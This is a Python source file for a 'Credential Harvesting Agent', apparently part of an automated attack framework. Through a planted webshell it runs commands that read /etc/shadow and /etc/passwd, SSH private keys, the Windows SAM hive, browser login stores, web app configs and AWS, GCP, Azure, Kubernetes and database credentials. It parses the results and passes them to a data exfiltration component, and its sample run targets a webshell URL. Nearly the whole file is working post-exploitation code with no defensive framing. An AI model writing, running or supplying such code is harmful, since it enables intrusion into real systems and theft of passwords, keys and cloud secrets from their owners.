from core.base_agent import BaseAgent
from core.data_models import AgentData, Strategy, AttackPhase
"""
Credential Harvesting Agent
ขโมย credentials จากระบบเป้าหมาย
"""

import asyncio
import re
import os
from typing import Dict, List, Optional
import logging

log = logging.getLogger(__name__)

# Get default shell password from environment variable
DEFAULT_SHELL_PASSWORD = os.getenv('SHELL_PASSWORD', 'secret')


class CredentialHarvester:
    """Credential harvesting agent"""
    
    def __init__(self, webshell_manager=None, data_exfiltrator=None):
        self.webshell = webshell_manager
        self.exfiltrator = data_exfiltrator
    
    async def run(self, target: Dict) -> Dict:
        """
        Main entry point for credential harvesting
        
        Args:
            target: Dict containing:
                - shell_url: Webshell URL
                - shell_password: Webshell password
                - target_url: Target URL (optional)
        
        Returns:
            Dict with harvesting results
        """
        shell_url = target.get('shell_url')
        shell_password = target.get('shell_password')
        
        if not shell_url or not shell_password:
            return {
                'success': False,
                'error': 'Missing shell_url or shell_password',
                'credentials': {}
            }
        
        try:
            credentials = await self.harvest_all(shell_url, shell_password)
            
            return {
                'success': True,
                'credentials': credentials,
                'total_harvested': credentials.get('total', 0)
            }
        
        except Exception as e:
            log.error(f"[CredHarvest] Error: {e}")
            return {
                'success': False,
                'error': str(e),
                'credentials': {}
            }
    
    async def harvest_all(self, shell_url: str, shell_password: str) -> Dict:
        """
        Harvest all credentials from target
        
        Args:
            shell_url: Webshell URL
            shell_password: Webshell password
        
        Returns:
            Dict with harvested credentials
        """
        
        log.info("[CredHarvest] Starting credential harvesting")
        
        results = {
            'linux_passwords': [],
            'ssh_keys': [],
            'browser_credentials': [],
            'application_credentials': [],
            'database_credentials': [],
            'cloud_credentials': [],
            'total': 0
        }
        
        # Detect OS
        os_info = await self.webshell.execute_command(
            shell_url,
            shell_password,
            'uname -s 2>/dev/null || echo Windows'
        )
        
        is_linux = 'Linux' in os_info.get('output', '')
        is_windows = 'Windows' in os_info.get('output', '')
        
        # Harvest based on OS
        if is_linux:
            # Linux credentials
            linux_creds = await self._harvest_linux_passwords(shell_url, shell_password)
            results['linux_passwords'] = linux_creds
            
            # SSH keys
            ssh_keys = await self._harvest_ssh_keys(shell_url, shell_password)
            results['ssh_keys'] = ssh_keys
        
        elif is_windows:
            # Windows credentials
            win_creds = await self._harvest_windows_passwords(shell_url, shell_password)
            results['windows_passwords'] = win_creds
        
        # Browser credentials (both OS)
        browser_creds = await self._harvest_browser_credentials(shell_url, shell_password)
        results['browser_credentials'] = browser_creds
        
        # Application credentials
        app_creds = await self._harvest_application_credentials(shell_url, shell_password)
        results['application_credentials'] = app_creds
        
        # Database credentials
        db_creds = await self._harvest_database_credentials(shell_url, shell_password)
        results['database_credentials'] = db_creds
        
        # Cloud credentials
        cloud_creds = await self._harvest_cloud_credentials(shell_url, shell_password)
        results['cloud_credentials'] = cloud_creds
        
        # Calculate total
        results['total'] = sum([
            len(results['linux_passwords']),
            len(results.get('windows_passwords', [])),
            len(results['ssh_keys']),
            len(results['browser_credentials']),
            len(results['application_credentials']),
            len(results['database_credentials']),
            len(results['cloud_credentials']),
        ])
        
        # Store all credentials
        if self.exfiltrator:
            for cred in results['linux_passwords']:
                self.exfiltrator.store_credentials(
                    username=cred['username'],
                    password=cred['password'],
                    source=f"linux_shadow_{shell_url}"
                )
            
            for key in results['ssh_keys']:
                self.exfiltrator.store_file(
                    filename=f"ssh_key_{key['user']}.pem",
                    content=key['private_key'].encode(),
                    source=shell_url
                )
        
        log.info(f"[CredHarvest] Harvested {results['total']} credentials")
        
        return results
    
    async def _harvest_linux_passwords(self, shell_url: str, shell_password: str) -> List[Dict]:
        """Harvest Linux password hashes"""
        
        credentials = []
        
        # Read /etc/shadow
        result = await self.webshell.execute_command(
            shell_url,
            shell_password,
            'cat /etc/shadow 2>/dev/null || echo "Permission denied"'
        )
        
        if 'Permission denied' not in result.get('output', ''):
            shadow_content = result.get('output', '')
            
            # Parse shadow file
            for line in shadow_content.split('\n'):
                if ':' in line and not line.startswith('#'):
                    parts = line.split(':')
                    if len(parts) >= 2:
                        username = parts[0]
                        password_hash = parts[1]
                        
                        if password_hash and password_hash not in ['*', '!', '!!']:
                            credentials.append({
                                'username': username,
                                'password': password_hash,
                                'type': 'shadow_hash'
                            })
        
        # Read /etc/passwd for user list
        result = await self.webshell.execute_command(
            shell_url,
            shell_password,
            'cat /etc/passwd'
        )
        
        passwd_content = result.get('output', '')
        
        # Store passwd file
        if self.exfiltrator and passwd_content:
            self.exfiltrator.store_file(
                filename='etc_passwd.txt',
                content=passwd_content.encode(),
                source=shell_url
            )
        
        return credentials
    
    async def _harvest_ssh_keys(self, shell_url: str, shell_password: str) -> List[Dict]:
        """Harvest SSH private keys"""
        
        ssh_keys = []
        
        # Find SSH keys
        home_dir = os.getenv('TARGET_HOME_DIR', '/home')
        result = await self.webshell.execute_command(
            shell_url,
            shell_password,
            f'find {home_dir} -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null'
        )
        
        key_paths = result.get('output', '').strip().split('\n')
        
        for key_path in key_paths:
            if key_path and key_path.strip():
                # Read private key
                key_result = await self.webshell.execute_command(
                    shell_url,
                    shell_password,
                    f'cat {key_path} 2>/dev/null'
                )
                
                private_key = key_result.get('output', '')
                
                if 'BEGIN' in private_key and 'PRIVATE KEY' in private_key:
                    # Extract username from path
                    user = key_path.split('/')[2] if len(key_path.split('/')) > 2 else 'unknown'
                    
                    ssh_keys.append({
                        'user': user,
                        'path': key_path,
                        'private_key': private_key,
                        'type': 'ssh_private_key'
                    })
                    
                    log.info(f"[CredHarvest] Found SSH key for user: {user}")
        
        # Also check /root/.ssh/
        result = await self.webshell.execute_command(
            shell_url,
            shell_password,
            'cat /root/.ssh/id_rsa 2>/dev/null'
        )
        
        root_key = result.get('output', '')
        
        if 'BEGIN' in root_key and 'PRIVATE KEY' in root_key:
            ssh_keys.append({
                'user': 'root',
                'path': '/root/.ssh/id_rsa',
                'private_key': root_key,
                'type': 'ssh_private_key'
            })
        
        return ssh_keys
    
    async def _harvest_windows_passwords(self, shell_url: str, shell_password: str) -> List[Dict]:
        """Harvest Windows passwords"""
        
        credentials = []
        
        # Dump SAM hashes (requires admin)
        result = await self.webshell.execute_command(
            shell_url,
            shell_password,
            'reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save 2>&1'
        )
        
        if 'completed successfully' in result.get('output', ''):
            # Download SAM file
            sam_result = await self.webshell.download_file(
                shell_url,
                shell_password,
                'C:\\Windows\\Temp\\sam.save'
            )
            
            if sam_result.get('success'):
                credentials.append({
                    'type': 'sam_hashes',
                    'file': 'sam.save',
                    'note': 'Use mimikatz or secretsdump.py to extract'
                })
        
        # Try to dump credentials with mimikatz (if available)
        result = await self.webshell.execute_command(
            shell_url,
            shell_password,
            'powershell -c "Get-Process mimikatz 2>$null"'
        )
        
        return credentials
    
    async def _harvest_browser_credentials(self, shell_url: str, shell_password: str) -> List[Dict]:
        """Harvest browser saved credentials"""
        
        credentials = []
        
        # Chrome/Chromium credentials (Linux)
        chrome_paths = [
            '~/.config/google-chrome/Default/Login Data',
            '~/.config/chromium/Default/Login Data',
        ]
        
        for path in chrome_paths:
            result = await self.webshell.execute_command(
                shell_url,
                shell_password,
                f'cat {path} 2>/dev/null | strings | head -100'
            )
            
            output = result.get('output', '')
            
            # Look for URLs and usernames
            urls = re.findall(r'https?://[^\s]+', output)
            
            if urls:
                credentials.append({
                    'browser': 'chrome',
                    'path': path,
                    'urls': urls[:10],
                    'note': 'Encrypted - requires decryption key'
                })
        
        # Firefox credentials (Linux)
        firefox_paths = [
            '~/.mozilla/firefox/*.default*/logins.json',
        ]
        
        for path in firefox_paths:
            result = await self.webshell.execute_command(
                shell_url,
                shell_password,
                f'find ~/.mozilla/firefox -name "logins.json" 2>/dev/null'
            )
            
            logins_path = result.get('output', '').strip()
            
            if logins_path:
                login_result = await self.webshell.execute_command(
                    shell_url,
                    shell_password,
                    f'cat {logins_path}'
                )
                
                logins_content = login_result.get('output', '')
                
                if logins_content:
                    credentials.append({
                        'browser': 'firefox',
                        'path': logins_path,
                        'content': logins_content[:500],
                        'note': 'Encrypted - requires master password'
                    })
        
        return credentials
    
    async def _harvest_application_credentials(self, shell_url: str, shell_password: str) -> List[Dict]:
        """Harvest application configuration files with credentials"""
        
        credentials = []
        
        # Common config files with credentials
        web_root = os.getenv('TARGET_WEB_ROOT', '/var/www/html')
        config_files = [
            # Web applications
            os.path.join(web_root, 'config.php'),
            os.path.join(web_root, 'wp-config.php'),
            os.path.join(web_root, '.env'),
            os.path.join(web_root, 'configuration.php'),
            
            # Application configs
            '~/.aws/credentials',
            '~/.ssh/config',
            '~/.docker/config.json',
            '~/.kube/config',
            '~/.npmrc',
            '~/.pypirc',
            '~/.gitconfig',
            
            # System configs
            '/etc/mysql/my.cnf',
            '/etc/postgresql/*/main/pg_hba.conf',
        ]
        
        for config_file in config_files:
            result = await self.webshell.execute_command(
                shell_url,
                shell_password,
                f'cat {config_file} 2>/dev/null'
            )
            
            content = result.get('output', '')
            
            if content and len(content) > 10:
                # Extract credentials from content
                extracted = self._extract_credentials_from_text(content)
                
                if extracted:
                    credentials.append({
                        'file': config_file,
                        'credentials': extracted,
                        'content_preview': content[:200]
                    })
                    
                    # Store file
                    if self.exfiltrator:
                        self.exfiltrator.store_file(
                            filename=config_file.replace('/', '_'),
                            content=content.encode(),
                            source=shell_url
                        )
        
        return credentials
    
    async def _harvest_database_credentials(self, shell_url: str, shell_password: str) -> List[Dict]:
        """Harvest database credentials"""
        
        credentials = []
        
        # MySQL credentials from config
        result = await self.webshell.execute_command(
            shell_url,
            shell_password,
            'cat /etc/mysql/debian.cnf 2>/dev/null'
        )
        
        debian_cnf = result.get('output', '')
        
        if debian_cnf:
            # Extract MySQL credentials
            user_match = re.search(r'user\s*=\s*(\S+)', debian_cnf)
            pass_match = re.search(r'password\s*=\s*(\S+)', debian_cnf)
            
            if user_match and pass_match:
                credentials.append({
                    'type': 'mysql',
                    'username': user_match.group(1),
                    'password': pass_match.group(1),
                    'source': '/etc/mysql/debian.cnf'
                })
        
        # PostgreSQL credentials
        result = await self.webshell.execute_command(
            shell_url,
            shell_password,
            'cat ~/.pgpass 2>/dev/null'
        )
        
        pgpass = result.get('output', '')
        
        if pgpass:
            for line in pgpass.split('\n'):
                if ':' in line:
                    parts = line.split(':')
                    if len(parts) >= 5:
                        credentials.append({
                            'type': 'postgresql',
                            'host': parts[0],
                            'port': parts[1],
                            'database': parts[2],
                            'username': parts[3],
                            'password': parts[4]
                        })
        
        return credentials
    
    async def _harvest_cloud_credentials(self, shell_url: str, shell_password: str) -> List[Dict]:
        """Harvest cloud provider credentials"""
        
        credentials = []
        
        # AWS credentials
        result = await self.webshell.execute_command(
            shell_url,
            shell_password,
            'cat ~/.aws/credentials 2>/dev/null'
        )
        
        aws_creds = result.get('output', '')
        
        if aws_creds:
            # Parse AWS credentials
            access_keys = re.findall(r'aws_access_key_id\s*=\s*(\S+)', aws_creds)
            secret_keys = re.findall(r'aws_secret_access_key\s*=\s*(\S+)', aws_creds)
            
            for i, (access_key, secret_key) in enumerate(zip(access_keys, secret_keys)):
                credentials.append({
                    'provider': 'aws',
                    'access_key_id': access_key,
                    'secret_access_key': secret_key,
                    'profile': f'profile_{i}'
                })
        
        # GCP credentials
        result = await self.webshell.execute_command(
            shell_url,
            shell_password,
            'find ~/.config/gcloud -name "*.json" 2>/dev/null'
        )
        
        gcp_files = result.get('output', '').strip().split('\n')
        
        for gcp_file in gcp_files:
            if gcp_file and '.json' in gcp_file:
                file_result = await self.webshell.execute_command(
                    shell_url,
                    shell_password,
                    f'cat {gcp_file}'
                )
                
                gcp_content = file_result.get('output', '')
                
                if 'private_key' in gcp_content:
                    credentials.append({
                        'provider': 'gcp',
                        'file': gcp_file,
                        'content': gcp_content[:500]
                    })
        
        # Azure credentials
        result = await self.webshell.execute_command(
            shell_url,
            shell_password,
            'cat ~/.azure/azureProfile.json 2>/dev/null'
        )
        
        azure_profile = result.get('output', '')
        
        if azure_profile:
            credentials.append({
                'provider': 'azure',
                'content': azure_profile[:500]
            })
        
        return credentials
    
    def _extract_credentials_from_text(self, text: str) -> List[Dict]:
        """Extract credentials from text content"""
        
        credentials = []
        
        # Common credential patterns
        patterns = [
            # Username/password
            (r'username["\']?\s*[:=]\s*["\']?(\S+)', r'password["\']?\s*[:=]\s*["\']?(\S+)'),
            (r'user["\']?\s*[:=]\s*["\']?(\S+)', r'pass["\']?\s*[:=]\s*["\']?(\S+)'),
            (r'DB_USER["\']?\s*[:=]\s*["\']?(\S+)', r'DB_PASS["\']?\s*[:=]\s*["\']?(\S+)'),
            
            # API keys
            (r'api_key["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-]{20,})', None),
            (r'secret_key["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-]{20,})', None),
            
            # Tokens
            (r'token["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-\.]{20,})', None),
            (r'access_token["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-\.]{20,})', None),
        ]
        
        for user_pattern, pass_pattern in patterns:
            user_matches = re.findall(user_pattern, text, re.IGNORECASE)
            
            if pass_pattern:
                pass_matches = re.findall(pass_pattern, text, re.IGNORECASE)
                
                for user, password in zip(user_matches, pass_matches):
                    credentials.append({
                        'username': user,
                        'password': password
                    })
            else:
                for match in user_matches:
                    credentials.append({
                        'type': 'api_key_or_token',
                        'value': match
                    })
        
        return credentials


# Example usage
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    async def test():
        from agents.post_exploitation.webshell_manager import WebshellManager
        from core.data_exfiltration import DataExfiltrator
        
        webshell = WebshellManager()
        exfiltrator = DataExfiltrator()
        
        harvester = CredentialHarvester(webshell, exfiltrator)
        
        # Harvest all credentials
        result = await harvester.harvest_all(
            shell_url="http://target.com/shell.php",
            shell_password=DEFAULT_SHELL_PASSWORD
        )
        
        print(f"Total credentials harvested: {result['total']}")
    
    asyncio.run(test())

